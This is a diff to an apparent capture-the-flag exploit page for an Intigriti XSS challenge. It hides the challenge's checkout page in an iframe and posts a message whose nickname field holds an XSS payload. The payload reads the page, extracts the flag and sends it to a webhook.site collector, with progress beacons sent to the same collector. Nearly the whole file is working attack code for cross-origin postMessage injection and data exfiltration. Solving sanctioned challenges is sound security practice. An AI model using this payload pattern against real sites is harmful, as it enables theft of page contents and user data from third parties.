@@ -4,45 +4,36 @@
 const BASE = 'https://challenge-0126.intigriti.io';
 const WEBHOOK = 'https://webhook.site/8213b378-934a-402b-8f55-fc2bac82c32d';
 
-// Track steps
-fetch(`${WEBHOOK}/?step=1_admin_visited`);
+fetch(`${WEBHOOK}/?step=1_start`);
 
-// XSS payload
 const xss = `<img src=x onerror="alert('gigawatz');fetch('${WEBHOOK}/?xss=1');const f=document.body.innerHTML;const m=f.match(/INTIGRITI{[^}]+}/);if(m)fetch('${WEBHOOK}/?flag='+encodeURIComponent(m[0]))">`;
 
-// Create iframe
-const iframe = document.createElement('iframe');
-iframe.src = `${BASE}/checkout.html?currency=1337COIN&price=1`;
-iframe.style.display = 'none';
-document.body.appendChild(iframe);
+const f = document.createElement('iframe');
+f.src = `${BASE}/checkout.html?currency=1337COIN&price=1`;
+f.style.display = 'none';
+document.body.appendChild(f);
 
-iframe.onload = () => {
-  fetch(`${WEBHOOK}/?step=2_checkout_loaded`);
+f.onload = () => {
+  fetch(`${WEBHOOK}/?step=2_loaded`);
 
   setTimeout(() => {
-    // Send postMessage
-    iframe.contentWindow.postMessage({
+    f.contentWindow.postMessage({
       type: 'submitTransaction',
       transaction: {
         nickname: xss,
-        toAddress: '0x1337',
+        toAddress: '10b5c9290725eeed3976d5dfe52fcbe23a',
         currency: '1337COIN',
         amount: 1
       }
     }, '*');
 
-    fetch(`${WEBHOOK}/?step=3_postmessage_sent`);
+    fetch(`${WEBHOOK}/?step=3_sent`);
 
-    // Wait longer for transaction to process, then redirect
     setTimeout(() => {
-      fetch(`${WEBHOOK}/?step=4_redirecting_to_marketwatch`);
+      fetch(`${WEBHOOK}/?step=4_redirect`);
       window.location = `${BASE}/marketwatch.html`;
-    }, 5000);
-  }, 3000);
-};
-
-iframe.onerror = () => {
-  fetch(`${WEBHOOK}/?step=error_iframe_failed`);
+    }, 3000);
+  }, 2000);
 };
 </script>
 </body>
